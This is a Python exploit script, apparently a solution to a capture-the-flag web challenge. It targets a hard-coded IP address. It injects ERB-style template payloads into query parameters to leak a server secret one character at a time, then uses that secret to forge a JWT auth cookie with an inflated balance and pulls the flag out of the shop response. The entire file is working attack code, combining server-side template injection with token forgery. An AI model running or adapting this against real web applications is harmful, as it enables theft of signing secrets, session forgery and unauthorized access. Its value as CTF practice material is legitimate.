#python 3
import requests

import jwt
import base64
# pip install PyJWT

dic = "0123456789abcdefghijklmnopqrstuvwxyz"
secret = ""
host = "http://47.110.15.101"
authUrl = host+"/api/auth"
workUrl = host+"/work"
shopUrl = host+"/shop"

req = requests.session()

# 获取身份
req.get(authUrl)



die = False
for i in range(50):

    if die:
        break
    for j in dic:
        url = workUrl + "?SECRET=" + secret + j + "&" + "name=<%25=$%26%25>" + "&" + "do=<%25=$%26%25> is working"

        res = req.get(url)
        #print(res.text)
        if secret + j in res.text:
            secret += j
            print(secret)
            break
        else:
            if j == "z":
                die = True
                break
            continue

die = False
for i in range(50):
    if die:
        break
    for j in dic:
        url = workUrl + "?SECRET=" + j + secret + "&" + "name=<%25=$%26%25>" + "&" + "do=<%25=$%26%25> is working"
        res = req.get(url)
        if j + secret in res.text:
            secret = j+secret
            print(secret)
            break
        else:
            if j == "z":
                die = True
                print("get! this is SECRET: "+secret)
                break
            continue

mycookie = req.cookies.get("auth")
print(mycookie)
mysecret = jwt.decode(mycookie,secret, algorithm='HS256')

mysecret['jkl'] = 10000000000000000000000000000

mycookie = jwt.encode(mysecret,secret,algorithm='HS256')
mycookie = str(mycookie, encoding='ascii')

req.cookies.clear()

req.cookies.set("auth",mycookie)

res = req.post(shopUrl)
# req.cookies.pop(0)
flag = req.cookies.values()[1].split(".")[1].encode(encoding='utf-8')
flag += (len(flag) % 4) * b"="
flag = base64.b64decode(flag)
print(flag)
#print(req.cookies.values())
# flag = jwt.decode(flag,secret, algorithm='HS256')
#
# print(flag)